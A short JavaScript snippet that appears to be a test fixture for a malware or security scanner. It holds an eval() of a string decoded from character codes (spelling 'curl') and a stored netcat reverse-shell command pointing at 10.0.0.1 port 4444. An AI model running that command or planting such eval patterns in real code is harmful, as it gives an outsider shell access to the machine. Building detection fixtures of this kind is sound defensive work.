// Obfuscated payload fixture
const payload = String.fromCharCode(99, 117, 114, 108);
eval(payload);

// Reverse shell marker
const cmd = "nc -e /bin/sh 10.0.0.1 4444";
